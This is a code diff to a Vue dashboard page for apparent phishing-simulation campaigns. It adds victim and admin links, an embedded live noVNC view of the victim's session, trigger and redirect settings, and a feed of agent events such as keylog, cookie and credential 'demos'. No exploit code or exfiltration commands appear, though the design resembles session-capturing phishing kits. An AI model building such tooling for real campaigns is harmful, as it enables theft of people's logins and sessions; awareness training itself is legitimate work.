@@ -3,7 +3,7 @@ import { motion } from 'motion-v'
 import {
   ArrowLeft, ExternalLink, Loader2, Trash2, Play, Pause, CheckCircle,
   Globe, Server, ArrowRightLeft, Monitor, Copy, RefreshCw, Zap,
-  Rocket, Terminal, XCircle, GitBranch,
+  Rocket, Terminal, XCircle, GitBranch, Activity, Wifi, WifiOff, Check,
 } from 'lucide-vue-next'
 import { Input } from '~/components/ui/input'
 import { Label } from '~/components/ui/label'
@@ -37,6 +37,7 @@ interface Deployment {
   current_step: string | null
   log: string | null
   link: string | null
+  admin_link: string | null
   error: string | null
   started_at: string | null
   finished_at: string | null
@@ -62,6 +63,8 @@ interface Campaign {
   server_domain: string | null
   deploy_repo_url: string | null
   deploy_branch: string | null
+  has_site_tweaks?: boolean
+  site_tweaks?: string | null
   deployment?: Deployment | null
   proxy_enabled: boolean
   proxy_on_the_fly: boolean
@@ -76,6 +79,19 @@ interface Campaign {
   start_date: string | null
   sessions: Session[]
   sessions_active: number
+  agent_online?: boolean
+  agent_version?: string | null
+  agent_last_seen_at?: string | null
+  events?: CampaignEvent[]
+}
+
+interface CampaignEvent {
+  id: number
+  event_type: string
+  action: string | null
+  severity: string | null
+  payload: Record<string, any> | null
+  occurred_at: string | null
 }
 
 // ─── Data ────────────────────────────────────────────────────────────────────
@@ -120,7 +136,37 @@ async function loadServers() {
 
 // ─── Deployment (SSH provisioning) ─────────────────────────────────────────────
 const deployment = ref<Deployment | null>(null)
-const deployForm = ref({ server_id: null as number | null, deploy_repo_url: '', deploy_branch: 'master' })
+
+// Admin view of the same session: no victim redirect (so embedding it never
+// navigates the dashboard away).
+const adminLink = computed(() => {
+  const d = deployment.value
+  if (!d) return ''
+  return d.admin_link || (d.link ? d.link.replace('&redirect=1', '') : '')
+})
+const copiedWhich = ref('')
+function copyLink(text: string, which: string) {
+  navigator.clipboard.writeText(text).then(() => {
+    copiedWhich.value = which
+    setTimeout(() => { if (copiedWhich.value === which) copiedWhich.value = '' }, 1500)
+  }).catch(() => {})
+}
+const deployForm = ref({
+  server_id: null as number | null,
+  deploy_repo_url: '',
+  deploy_branch: 'master',
+  trigger_action: 'login',
+  redirect_target: '',
+})
+
+const TRIGGER_OPTIONS = [
+  { value: 'login', label: 'Login / Sign-in' },
+  { value: 'scan', label: 'QR code scan' },
+  { value: 'click', label: 'Link click' },
+  { value: 'submit', label: 'Form submit' },
+  { value: 'download', label: 'File download' },
+  { value: 'pageload', label: 'Page load' },
+]
 const deployStarting = ref(false)
 const deployError = ref('')
 let deployTimer: ReturnType<typeof setInterval> | null = null
@@ -134,6 +180,8 @@ function syncDeployForm() {
   deployForm.value.server_id = campaign.value.server_id ?? deployForm.value.server_id ?? null
   if (campaign.value.deploy_repo_url) deployForm.value.deploy_repo_url = campaign.value.deploy_repo_url
   if (campaign.value.deploy_branch) deployForm.value.deploy_branch = campaign.value.deploy_branch
+  if (campaign.value.trigger_action) deployForm.value.trigger_action = campaign.value.trigger_action
+  deployForm.value.redirect_target = campaign.value.redirect_target ?? ''
 }
 
 async function pollDeployment() {
@@ -172,6 +220,9 @@ async function startDeploy() {
           server_id: deployForm.value.server_id,
           deploy_repo_url: deployForm.value.deploy_repo_url || null,
           deploy_branch: deployForm.value.deploy_branch || null,
+          trigger_action: deployForm.value.trigger_action,
+          redirect_type: 'url',
+          redirect_target: deployForm.value.redirect_target || null,
         },
       },
     )
@@ -244,7 +295,7 @@ async function killSession(sessionId: number) {
 const novncUrl = computed(() => {
   if (!campaign.value?.server_domain) return ''
   const d = campaign.value.server_domain
-  return `http://${d}:6080/vnc.html?host=${d}&port=6080&autoconnect=true&resize=scale`
+  return `http://${d}:6080/pgvnc.html?host=${d}&port=6080&autoconnect=true&scale=true`
 })
 
 const campaignUrl = computed(() => {
@@ -284,7 +335,7 @@ watch(() => deployment.value?.log, async () => {
   if (logBox.value) logBox.value.scrollTop = logBox.value.scrollHeight
 })
 
-const DEPLOY_STEPS = ['Connecting', 'Installing dependencies', 'Cloning project', 'Starting containers', 'Done']
+const DEPLOY_STEPS = ['Connecting', 'Installing dependencies', 'Cloning project', 'Applying site tweaks', 'Starting containers', 'Done']
 function stepState(label: string): 'done' | 'active' | 'todo' {
   const d = deployment.value
   if (!d) return 'todo'
@@ -299,6 +350,28 @@ function stepState(label: string): 'done' | 'active' | 'todo' {
 
 function deployStatusVariant(s: string) {
   return s === 'success' ? 'success' : s === 'failed' ? 'destructive' : 'warning'
+}
+
+// ─── Activity feed (agent events) ──────────────────────────────────────────────
+const EVENT_LABEL: Record<string, string> = {
+  'campaign.activated': 'Agent activated',
+  'session.notification': 'Session activity',
+  'security.phishing_detected': 'Phishing detected',
+  'evidence.uploaded': 'Evidence uploaded',
+  'training.keylog_demo': 'Training: keylog demo',
+  'training.cookies_demo': 'Training: cookie demo',
+  'training.credentials_demo': 'Training: credential demo',
+}
+function eventLabel(e: CampaignEvent) {
+  const base = EVENT_LABEL[e.event_type] ?? e.event_type
+  return e.action ? `${base} — ${e.action.replace(/_/g, ' ')}` : base
+}
+function eventDetail(e: CampaignEvent) {
+  const p = e.payload || {}
+  if (p.url) return p.url
+  if (p.metadata?.browser) return p.metadata.browser
+  if (p.classification) return `${p.classification} (risk ${p.risk_score ?? '?'})`
+  return ''
 }
 </script>
 
@@ -335,6 +408,20 @@ function deployStatusVariant(s: string) {
               >
                 <span class="size-1.5 rounded-full bg-green-500 animate-pulse inline-block" />
                 {{ campaign.sessions_active }} live
+              </span>
+              <span
+                v-if="campaign.agent_online"
+                class="inline-flex items-center gap-1 rounded-full bg-primary/10 px-2 py-0.5 text-[11px] font-medium text-primary"
+                title="Agent is reporting data"
+              >
+                <Wifi class="size-3" /> Agent online
+              </span>
+              <span
+                v-else-if="campaign.agent_last_seen_at"
+                class="inline-flex items-center gap-1 rounded-full bg-muted px-2 py-0.5 text-[11px] font-medium text-muted-foreground"
+                title="No recent agent heartbeat"
+              >
+                <WifiOff class="size-3" /> Agent offline
               </span>
             </div>
             <p v-if="campaign.description" class="text-sm text-muted-foreground mt-0.5">{{ campaign.description }}</p>
@@ -596,6 +683,32 @@ function deployStatusVariant(s: string) {
               </div>
             </div>
 
+            <!-- Trigger + redirect (what happens when the victim acts) -->
+            <div class="grid grid-cols-1 gap-3 sm:grid-cols-3">
+              <div class="space-y-1.5">
+                <Label for="dep-trigger">Trigger</Label>
+                <select
+                  id="dep-trigger"
+                  v-model="deployForm.trigger_action"
+                  :disabled="isDeploying"
+                  class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:opacity-60"
+                >
+                  <option v-for="o in TRIGGER_OPTIONS" :key="o.value" :value="o.value">{{ o.label }}</option>
+                </select>
+              </div>
+              <div class="space-y-1.5 sm:col-span-2">
+                <Label for="dep-redirect">Redirect URL <span class="text-destructive">*</span></Label>
+                <Input
+                  id="dep-redirect"
+                  v-model="deployForm.redirect_target"
+                  :disabled="isDeploying"
+                  type="url"
+                  placeholder="https://your-awareness-page.com"
+                />
+                <p class="text-xs text-muted-foreground">Where the victim's browser is sent when the trigger fires. Must be a real page — not the target site's own login.</p>
+              </div>
+            </div>
+
             <p v-if="deployError" class="rounded-md border border-destructive/20 bg-destructive/10 px-3 py-2 text-sm text-destructive">
               {{ deployError }}
             </p>
@@ -617,18 +730,44 @@ function deployStatusVariant(s: string) {
               </template>
             </div>
 
-            <!-- Success link -->
-            <a
-              v-if="deployment?.status === 'success' && deployment.link"
-              :href="deployment.link"
-              target="_blank"
-              rel="noopener noreferrer"
-              class="flex items-center gap-2 rounded-lg border border-green-500/30 bg-green-500/10 px-4 py-3 text-sm font-medium text-green-700 dark:text-green-400 hover:bg-green-500/15 transition-colors"
-            >
-              <Monitor class="size-4" />
-              <span class="flex-1">View the modified site</span>
-              <ExternalLink class="size-3.5" />
-            </a>
+            <!-- Success: links + live admin view -->
+            <div v-if="deployment?.status === 'success' && deployment.link" class="space-y-3">
+              <!-- Victim link (send this one) -->
+              <div class="flex items-center gap-2 rounded-lg border border-border bg-muted/20 px-3 py-2">
+                <Badge variant="secondary" class="shrink-0">Victim</Badge>
+                <code class="flex-1 truncate font-mono text-xs text-muted-foreground">{{ deployment.link }}</code>
+                <button class="rounded p-1.5 hover:bg-muted" title="Copy victim link" @click="copyLink(deployment.link!, 'victim')">
+                  <Check v-if="copiedWhich === 'victim'" class="size-3.5 text-green-600" />
+                  <Copy v-else class="size-3.5" />
+                </button>
+                <a :href="deployment.link" target="_blank" rel="noopener noreferrer" class="rounded p-1.5 hover:bg-muted" title="Open">
+                  <ExternalLink class="size-3.5" />
+                </a>
+              </div>
+
+              <!-- Admin link (observe/control, never redirects) -->
+              <div class="flex items-center gap-2 rounded-lg border border-border bg-muted/20 px-3 py-2">
+                <Badge class="shrink-0">Admin</Badge>
+                <code class="flex-1 truncate font-mono text-xs text-muted-foreground">{{ deployment.admin_link || deployment.link.replace('&redirect=1','') }}</code>
+                <button class="rounded p-1.5 hover:bg-muted" title="Copy admin link" @click="copyLink(adminLink, 'admin')">
+                  <Check v-if="copiedWhich === 'admin'" class="size-3.5 text-green-600" />
+                  <Copy v-else class="size-3.5" />
+                </button>
+                <a :href="adminLink" target="_blank" rel="noopener noreferrer" class="rounded p-1.5 hover:bg-muted" title="Open">
+                  <ExternalLink class="size-3.5" />
+                </a>
+              </div>
+
+              <!-- Embedded live admin view of the same session -->
+              <div class="space-y-1.5">
+                <div class="flex items-center gap-1.5 text-xs font-medium text-muted-foreground">
+                  <Monitor class="size-3.5" /> Live session (admin view)
+                </div>
+                <div class="h-[420px] overflow-hidden rounded-lg border border-border bg-black">
+                  <NoVncFrame :url="adminLink" />
+                </div>
+              </div>
+            </div>
 
             <!-- Failure -->
             <p
@@ -651,6 +790,52 @@ function deployStatusVariant(s: string) {
               >{{ deployment.log }}</pre>
             </div>
           </CardContent>
+        </Card>
+      </motion.div>
+
+      <!-- ── Activity feed (data reported by the campaign agent) ──────────── -->
+      <motion.div
+        :initial="{ opacity: 0, y: 8 }"
+        :animate="{ opacity: 1, y: 0 }"
+        :transition="{ delay: 0.14, duration: 0.35 }"
+      >
+        <Card class="overflow-hidden p-0">
+          <div class="flex items-center justify-between px-5 py-4 border-b border-border bg-muted/20">
+            <div class="flex items-center gap-2">
+              <Activity class="size-4 text-primary" />
+              <h3 class="text-sm font-semibold">Activity</h3>
+              <span class="text-xs text-muted-foreground">
+                reported by the agent{{ campaign.agent_version ? ` · v${campaign.agent_version}` : '' }}
+              </span>
+            </div>
+            <span v-if="campaign.agent_last_seen_at" class="text-xs text-muted-foreground">
+              last seen {{ new Date(campaign.agent_last_seen_at).toLocaleTimeString() }}
+            </span>
+          </div>
+
+          <div
+            v-for="e in campaign.events"
+            :key="e.id"
+            class="flex items-start gap-3 border-b border-border/50 px-5 py-3 last:border-0 hover:bg-primary/5 transition-colors"
+          >
+            <span class="mt-1.5 size-1.5 shrink-0 rounded-full bg-primary/60" />
+            <div class="min-w-0 flex-1">
+              <p class="text-sm font-medium">{{ eventLabel(e) }}</p>
+              <p v-if="eventDetail(e)" class="truncate text-xs text-muted-foreground font-mono">{{ eventDetail(e) }}</p>
+            </div>
+            <span class="shrink-0 text-xs text-muted-foreground">
+              {{ e.occurred_at ? new Date(e.occurred_at).toLocaleString() : '' }}
+            </span>
+          </div>
+
+          <div v-if="!campaign.events || campaign.events.length === 0" class="px-5 py-12 text-center text-sm text-muted-foreground">
+            <Activity class="mx-auto mb-3 size-8 opacity-30" />
+            <p class="font-medium text-foreground">No agent data yet</p>
+            <p class="mt-1 text-xs max-w-sm mx-auto">
+              Once a campaign is deployed and its agent connects, activation,
+              heartbeats and session activity appear here.
+            </p>
+          </div>
         </Card>
       </motion.div>
 
